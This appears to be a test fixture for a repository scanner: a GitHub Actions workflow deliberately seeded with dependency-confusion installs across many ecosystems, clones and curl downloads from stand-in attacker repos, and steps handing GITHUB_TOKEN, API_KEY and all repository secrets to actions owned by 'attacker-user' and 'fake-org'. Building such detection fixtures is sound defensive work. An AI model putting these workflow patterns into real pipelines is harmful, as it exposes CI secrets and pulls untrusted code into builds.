@@ -1,0 +1,316 @@
+# Testing file for GitHub repo scanner - GitHub Actions vulnerabilities
+name: Comprehensive Vulnerability Test Workflow
+
+on:
+  push:
+    branches: [ main, develop ]
+  pull_request:
+    branches: [ main ]
+
+env:
+  # Environment variables with dependency confusion vulnerabilities
+  NPM_PACKAGES: "internal-company-auth@1.0.0 private-api-client@^2.1.0"
+  PYTHON_PACKAGES: "company-data-lib==1.2.3 internal-ml-utils==0.5.0"
+  RUBY_GEMS: "internal_auth_gem company_secret_utils"
+  JAVA_ARTIFACTS: "com.company:internal-utils:1.0.0"
+  GO_MODULES: "github.com/company/internal-auth@v1.2.3"
+  PHP_PACKAGES: "company/internal-lib:^1.0 private/secret-utils:dev-main"
+  RUST_CRATES: "internal-auth-crate:0.1.2 company-secret-rust:0.2.0"
+  ELIXIR_PACKAGES: "internal_elixir_auth:~>1.0"
+  DOTNET_PACKAGES: "InternalCompanyAuth:1.0.0 PrivateDataUtils:2.1.0"
+  DART_PACKAGES: "internal_flutter_auth:^1.0.0"
+  PERL_MODULES: "Internal::Company::Auth Company::Secret::Utils"
+  R_PACKAGES: "internalCompanyR privateAnalyticsR"
+  SWIFT_PACKAGES: "internal-swift-auth company-secret-swift"
+  HASKELL_LIBS: "internal-auth-haskell company-secret-haskell"
+  JULIA_PACKAGES: "InternalCompanyJulia PrivateAnalyticsJulia"
+  CONAN_LIBS: "internal-auth-cpp/1.0.0@company/stable"
+  BAZEL_TARGETS: "@internal_workspace//auth:lib"
+
+jobs:
+  # Job with repo jacking vulnerabilities
+  repo-jacking-test:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    
+    # Suspicious GitHub repo cloning
+    - name: Clone suspicious repos
+      run: |
+        git clone https://github.com/nonexistent-org/fake-auth-lib.git /tmp/fake-auth
+        git clone https://github.com/attacker-user/malicious-package.git /tmp/malicious
+        git clone https://github.com/fake-company/backdoor-utils.git /tmp/backdoor
+    
+    # Submodule vulnerabilities
+    - name: Add suspicious submodules
+      run: |
+        git submodule add https://github.com/compromised-org/malware-lib.git libs/malware
+        git submodule add https://github.com/fake-maintainer/backdoor-module.git modules/backdoor
+    
+    # Download from suspicious sources
+    - name: Download suspicious packages
+      run: |
+        wget https://github.com/attacker/malicious-release/archive/v1.0.0.zip
+        curl -L https://github.com/fake-org/compromised-tool/tarball/main | tar xz
+
+  # Job testing all 17 dependency confusion platforms
+  dependency-confusion-test:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    
+    # 1. NPM dependency confusion
+    - name: NPM vulnerabilities
+      run: |
+        npm install internal-company-auth@1.0.0
+        npm install private-api-client@^2.1.0 company-secret-utils
+        yarn add internal-frontend-lib@latest
+        pnpm add company-private-components@~2.0.0
+    
+    # 2. Python dependency confusion  
+    - name: Python vulnerabilities
+      run: |
+        pip install company-data-processor==1.2.3
+        pip install internal-ml-toolkit==0.5.0 private-analytics-lib
+        poetry add internal-company-utils@^1.0.0
+        pipenv install company-secret-package==2.1.0
+    
+    # 3. Ruby dependency confusion
+    - name: Ruby vulnerabilities  
+      run: |
+        gem install internal_company_auth -v 1.0.0
+        gem install private_data_gem company_secret_utils
+        bundle add internal_rails_auth --version="~> 2.0"
+    
+    # 4. Java/Maven dependency confusion
+    - name: Java vulnerabilities
+      run: |
+        mvn dependency:get -Dartifact=com.company:internal-auth:1.0.0
+        gradle dependencies --configuration implementation
+        sbt "libraryDependencies += \"com.company\" % \"private-utils\" % \"1.2.3\""
+    
+    # 5. Go dependency confusion
+    - name: Go vulnerabilities
+      run: |
+        go get github.com/company/internal-auth@v1.2.3
+        go install company.com/private/secret-tool@latest
+        go mod download github.com/company/internal-data@v0.5.0
+    
+    # 6. PHP dependency confusion
+    - name: PHP vulnerabilities
+      run: |
+        composer require company/internal-auth-lib:^1.0
+        composer install company/private-data-processor:dev-main
+        composer global require company/secret-cli-tool
+    
+    # 7. Rust dependency confusion
+    - name: Rust vulnerabilities
+      run: |
+        cargo install internal-company-auth --version 0.1.2
+        cargo add company-secret-crate@0.2.0
+        cargo build --manifest-path=./internal-rust/Cargo.toml
+    
+    # 8. Elixir dependency confusion
+    - name: Elixir vulnerabilities
+      run: |
+        mix deps.get internal_company_auth
+        mix archive.install hex company_secret_mix 1.0.0
+        mix escript.install hex internal_company_tool
+    
+    # 9. .NET dependency confusion
+    - name: .NET vulnerabilities
+      run: |
+        dotnet add package InternalCompanyAuth --version 1.0.0
+        nuget install PrivateDataUtils -Version 2.1.0
+        paket add InternalCompanyLib --version 1.2.3
+    
+    # 10. Dart dependency confusion
+    - name: Dart vulnerabilities
+      run: |
+        dart pub add internal_company_auth:^1.0.0
+        flutter pub add company_secret_widgets:latest
+        dart pub global activate internal_company_tool
+    
+    # 11. Perl dependency confusion
+    - name: Perl vulnerabilities
+      run: |
+        cpan install Internal::Company::Auth
+        perl -MCPAN -e 'install Company::Secret::Utils'
+        cpanm Internal::Company::Data::Processor
+    
+    # 12. R dependency confusion
+    - name: R vulnerabilities
+      run: |
+        R -e "install.packages('internalCompanyAuth')"
+        Rscript -e "devtools::install_github('company/private-r-analytics')"
+        R -e "pak::pkg_install('company/internal-r-utils')"
+    
+    # 13. Swift dependency confusion
+    - name: Swift vulnerabilities
+      run: |
+        swift package update internal-company-auth
+        swift build --package-path ./internal-swift-lib
+        swift package resolve internal-secret-package
+    
+    # 14. Haskell dependency confusion
+    - name: Haskell vulnerabilities
+      run: |
+        cabal install internal-company-auth
+        stack install company-secret-haskell
+        cabal update && cabal install internal-haskell-utils
+    
+    # 15. Julia dependency confusion
+    - name: Julia vulnerabilities
+      run: |
+        julia -e 'using Pkg; Pkg.add("InternalCompanyAuth")'
+        julia -e 'Pkg.add(PackageSpec(name="CompanySecretData", version="1.0.0"))'
+        julia --project=./internal-julia -e 'Pkg.instantiate()'
+    
+    # 16. Conan dependency confusion
+    - name: Conan vulnerabilities
+      run: |
+        conan install internal-company-auth/1.0.0@company/stable
+        conan create . company/internal-cpp-utils@1.2.3
+        conan upload company-secret-lib/2.0.0@company/testing
+    
+    # Actions that reference nested config files
+    - name: Setup Node.js with nested config
+      uses: actions/setup-node@v3
+      with:
+        node-version: '18'
+        cache: 'npm'
+        cache-dependency-path: './frontend-workspace/package.json'
+    
+    - name: Install from nested frontend workspace
+      working-directory: ./frontend-workspace
+      run: |
+        npm ci
+        npm install internal-company-frontend@1.0.0
+        
+    - name: Setup Python with nested config
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.9'
+        cache: 'pip'
+        cache-dependency-path: './backend-services/requirements.txt'
+        
+    - name: Install from nested backend workspace  
+      working-directory: ./backend-services
+      run: |
+        pip install -r requirements.txt
+        pip install company-backend-utils==1.2.3
+        
+    - name: Process microservices configs
+      run: |
+        # Test nested config detection across multiple directories
+        cd ./microservices/api && npm install internal-api-auth@1.0.0
+        cd ./microservices/auth-service && pip install company-auth-lib==2.1.0
+        cd ./microservices/data-processor && cargo build
+        cd ./frontend-workspace && yarn add private-frontend-components@^1.5.0
+
+  # Job testing workspace/path vulnerabilities for 8 platforms
+  workspace-vulnerabilities-test:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    
+    # NPM workspace/path vulnerabilities
+    - name: NPM workspace vulnerabilities
+      run: |
+        npm install file:../internal-packages/company-auth
+        yarn add file:./workspace/missing-frontend-lib
+        pnpm add file:../../private-npm-packages/secret-utils
+        npm install file:../nonexistent-workspace/auth-module
+    
+    # Python editable/path vulnerabilities
+    - name: Python workspace vulnerabilities
+      run: |
+        pip install -e ../internal-python-libs/company-auth
+        pip install --editable ./workspace/missing-python-package
+        pip install -e /workspace/nonexistent-python-lib
+        python -m pip install -e ../private-python/secret-data-processor
+    
+    # Rust path vulnerabilities
+    - name: Rust workspace vulnerabilities
+      run: |
+        cargo install --path ../internal-rust-workspace/company-auth
+        cargo build --manifest-path=./workspace/missing-rust-crate/Cargo.toml
+        cargo add company-secret-crate --path ../nonexistent-rust-workspace
+        cargo install --path /workspace/missing-rust-tool
+    
+    # Go local module vulnerabilities  
+    - name: Go workspace vulnerabilities
+      run: |
+        go mod edit -require=../internal-go-modules/company-auth@v0.0.0
+        go get ./workspace/missing-go-module
+        go install ./nonexistent-go-workspace/secret-tool
+        go mod download ./private-go-libs/internal-utils
+    
+    # PHP path repository vulnerabilities
+    - name: PHP workspace vulnerabilities  
+      run: |
+        composer require company/auth-lib --repository='{"type":"path","url":"../internal-php-libs"}'
+        composer install --working-dir=./workspace/missing-php-package
+        composer require company/secret-utils --repository='{"type":"path","url":"../nonexistent-php"}'
+    
+    # Ruby local gem vulnerabilities
+    - name: Ruby workspace vulnerabilities
+      run: |
+        bundle add company_auth_gem --path ../internal-ruby-workspace/auth
+        gem build ./workspace/missing-ruby-gem/company_secret.gemspec
+        bundle add internal_utils_gem --path ../nonexistent-ruby-workspace
+    
+    # Dart local package vulnerabilities
+    - name: Dart workspace vulnerabilities
+      run: |
+        dart pub add company_auth --path=../internal-flutter-packages/auth
+        dart pub get --directory=./workspace/missing-dart-package
+        flutter pub add company_secret_widgets --path=../nonexistent-flutter-libs
+    
+    # Bazel workspace vulnerabilities
+    - name: Bazel workspace vulnerabilities
+      run: |
+        bazel build //workspace/missing-bazel-package:all
+        bazel run @nonexistent_company_workspace//tools:deploy
+        bazel test //internal-workspace/missing:company_auth_test
+
+  # Job with action-based vulnerabilities
+  action-vulnerabilities-test:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    
+    # Using suspicious/nonexistent actions (repo jacking)
+    - uses: fake-org/malicious-action@v1
+      with:
+        token: ${{ secrets.GITHUB_TOKEN }}
+    
+    - uses: nonexistent-maintainer/backdoor-deploy@main
+      with:
+        api-key: ${{ secrets.API_KEY }}
+    
+    - uses: attacker-user/compromised-build@v2.1.0
+      with:
+        secrets: ${{ toJson(secrets) }}
+    
+    # Actions with dependency confusion in their with parameters
+    - uses: actions/setup-node@v3
+      with:
+        node-version: '18'
+        registry-url: 'https://npm.pkg.github.com'
+    - run: npm install internal-company-auth@1.0.0 private-frontend-lib@^2.0.0
+    
+    - uses: actions/setup-python@v4
+      with:
+        python-version: '3.9'
+    - run: pip install company-data-processor==1.2.3 internal-ml-utils
+    
+    - uses: actions-rs/cargo@v1
+      with:
+        command: install
+        args: --path ../internal-rust-workspace/missing-crate
+    
+    - uses: actions/setup-go@v4
+      with:
+        go-version: '1.19'
+    - run: go get github.com/company/internal-auth@v1.2.3
